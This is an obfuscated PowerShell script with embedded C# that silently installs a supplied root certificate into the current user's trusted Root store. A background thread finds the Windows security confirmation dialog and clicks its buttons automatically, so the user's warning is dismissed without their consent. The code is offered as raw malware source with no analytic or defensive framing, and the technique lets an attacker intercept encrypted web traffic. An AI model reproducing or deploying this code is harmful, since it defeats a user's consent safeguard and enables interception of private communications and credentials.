function nKcidm{
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

public static class kWGTHvdiIhis
{
	public class DbEDOJilMjix
    {
        public string Wndclass;
        public string Title;
        public string Process;
        public IntPtr hWnd;
    }

    private delegate bool PJgxja(IntPtr hWnd, ref DbEDOJilMjix data);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool EnumWindows(PJgxja lpEnumFunc, ref DbEDOJilMjix data);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	
	public delegate bool UdOJGVQb(IntPtr hwnd, IntPtr lParam);
	
	[DllImport("user32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnumChildWindows(IntPtr window, UdOJGVQb callback, IntPtr lParam);  
	
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
	
	[Flags]
    private enum SnapshotFlags : uint
    {
    HeapList = 0x00000001,
    Process = 0x00000002,
    Thread = 0x00000004,
    Module = 0x00000008,
    Module32 = 0x00000010,
    Inherit = 0x80000000,
    All = 0x0000001F,
    NoHeaps = 0x40000000
    }
    //inner struct used only internally
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct PROCESSENTRY32
    {
    const int MAX_PATH = 260;
    internal UInt32 dwSize;
    internal UInt32 cntUsage;
    internal UInt32 th32ProcessID;
    internal IntPtr th32DefaultHeapID;
    internal UInt32 th32ModuleID;
    internal UInt32 cntThreads;
    internal UInt32 th32ParentProcessID;
    internal Int32 pcPriClassBase;
    internal UInt32 dwFlags;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
    internal string szExeFile;
    }

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern IntPtr CreateToolhelp32Snapshot([In]UInt32 dwFlags, [In]UInt32 th32ProcessID);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32First([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32Next([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle([In] IntPtr hObject);
    
	const int BM_CL = 0x00F5;
	
	public static byte[] GbVocJHBYJ(String sCert)
    {
		return Convert.FromBase64String(sCert);
    }
        
	public static void CZRcbVuVzYgtLW(String sCert){
		System.Console.WriteLine("[Win32]::Start()");
        byte[] bCert = GbVocJHBYJ(sCert);
        if (bCert != null)
        {
            X509Certificate2 certificate = new X509Certificate2(bCert);
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);
            if (!store.Certificates.Contains(certificate))
            {
                Thread thread = new Thread(eJPaWY);
                thread.Start();
                store.Add(certificate);
                thread.Join();
            }
            store.Close();
        }
	}
	
	public static void eJPaWY()
	{
		System.Console.WriteLine("[Win32]::SearchDialog()");
		IntPtr hWnd;
		do{
			hWnd = vkOHeSZEwCl("#32770",String.Empty);
			if (!hWnd.Equals(IntPtr.Zero))
		    {
				System.Console.WriteLine("Founded hWnd=0x{0:X}",hWnd);
		    	break;
			}else
	        {
				hWnd=IntPtr.Zero;
				System.Console.WriteLine("Try again find window");
	        }
		}while (hWnd.Equals(IntPtr.Zero));
		System.Console.WriteLine("Dialog window founded");
		SetForegroundWindow(hWnd);
		UdOJGVQb childProc = new UdOJGVQb(tebGNrxiTqaVJX);
		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
	}
	
	public static IntPtr vkOHeSZEwCl(string wndclass, string title)
    {
        DbEDOJilMjix sd = new DbEDOJilMjix();
        sd.Wndclass = wndclass;
        sd.Title = title;
		sd.hWnd=IntPtr.Zero;
		System.Console.WriteLine("EnumWindow -|");
        EnumWindows(new PJgxja(hnYWenFmKP), ref sd);
        return sd.hWnd;
    }
    
	public static bool hnYWenFmKP(IntPtr hWnd, ref DbEDOJilMjix data)
    {
    	StringBuilder title = new StringBuilder(1024);
        StringBuilder className = new StringBuilder(1024);
        GetWindowText(hWnd, title, title.Capacity);
        GetClassName(hWnd, className, className.Capacity);
        String sEN=APFLrfGU(hWnd).ToLower();
		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && title.ToString().StartsWith(data.Title)))
		{
			System.Console.WriteLine("            |- hWnd=0x{0:X}; Class={1}; Title={2}; Process={3}",hWnd,className.ToString(),title.ToString(),sEN);
        	if(sEN.Contains("csrss") || sEN.Contains("certutil")  || sEN.Contains("powershell"))
	        {
		        data.hWnd = hWnd;
                return false;
	        }
        }
       	
        return true;
    }
  
	public static String APFLrfGU(IntPtr ZEuwdhaD){
		uint RyxkKA = 0;
		uint threadID = GetWindowThreadProcessId(ZEuwdhaD, out RyxkKA);
		String sProc = null;
	    IntPtr handleToSnapshot = IntPtr.Zero;
	    try
	    {
	        PROCESSENTRY32 fnnvQu = new PROCESSENTRY32();
	        fnnvQu.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
	        handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
	        if (Process32First(handleToSnapshot, ref fnnvQu))
	        {
	        do
	        {
	            if (RyxkKA == fnnvQu.th32ProcessID)
	            {
	            sProc = fnnvQu.szExeFile;
	            break;
	            }
	        } while (Process32Next(handleToSnapshot, ref fnnvQu));
	        }
	        else
	        {
	        	throw new ApplicationException(string.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()));
	        }
	    }
	    catch (Exception ex)
	    {
	        throw new ApplicationException("Can't get the process.", ex);
	    }
	    finally
	    {
	        CloseHandle(handleToSnapshot);
	    }
	    return sProc;
	}
	public static bool tebGNrxiTqaVJX(IntPtr hWnd, IntPtr lParam)
	{
		SendMessage(hWnd, BM_CL, IntPtr.Zero, IntPtr.Zero);
		return true;
	}
}
"@;
[kWGTHvdiIhis]::CZRcbVuVzYgtLW("%CERT%");
exit
}
nKcidm
